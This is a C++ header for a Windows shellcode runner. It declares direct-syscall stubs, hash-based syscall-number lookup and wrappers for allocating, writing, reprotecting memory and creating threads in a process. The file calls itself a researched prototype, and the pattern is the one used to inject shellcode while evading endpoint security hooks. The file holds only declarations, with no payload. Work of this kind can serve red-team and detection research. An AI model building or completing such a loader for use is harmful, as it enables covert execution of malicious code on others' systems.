#pragma once
#include <windows.h>
#include <vector>

// Defined in syscalls.asm
extern "C" void SetCurrentSSN(DWORD ssn);
extern "C" NTSTATUS InvokeSyscall(
    PVOID Arg1, PVOID Arg2, PVOID Arg3, PVOID Arg4, 
    PVOID Arg5 = NULL, PVOID Arg6 = NULL, PVOID Arg7 = NULL, PVOID Arg8 = NULL, PVOID Arg9 = NULL, PVOID Arg10 = NULL
); 
// Note: Variadic or fixed args in C++ for ASM calls can be tricky regarding stack shadow space. 
// For simplicity in this researched prototype, we define with enough fixed args or rely on x64 calling convention which pushes >4 args to stack.
// However, `InvokeSyscall` ASM stub simply does `syscall`. It does NOT fix up the stack for the kernel. 

class NativeSyscalls {
public:
    static void Init();
    
    // Core Syscalls for Shellcode Runner
    static NTSTATUS AllocateVirtualMemory(HANDLE hProcess, PVOID* baseAddress, ULONG_PTR zeroBits, PSIZE_T regionSize, ULONG allocType, ULONG protect);
    static NTSTATUS WriteVirtualMemory(HANDLE hProcess, PVOID baseAddress, PVOID buffer, SIZE_T size, PSIZE_T bytesWritten);
    static NTSTATUS ProtectVirtualMemory(HANDLE hProcess, PVOID* baseAddress, PSIZE_T regionSize, ULONG newProtect, PULONG oldProtect);
    static NTSTATUS CreateThreadEx(PHANDLE threadHandle, ACCESS_MASK desiredAccess, PVOID objectAttributes, HANDLE processHandle, PVOID startRoutine, PVOID argument, ULONG createFlags, ULONG_PTR zeroBits, SIZE_T stackSize, SIZE_T maxStackSize, PVOID attributeList);

private:
    static DWORD GetSSN(DWORD hash);
};
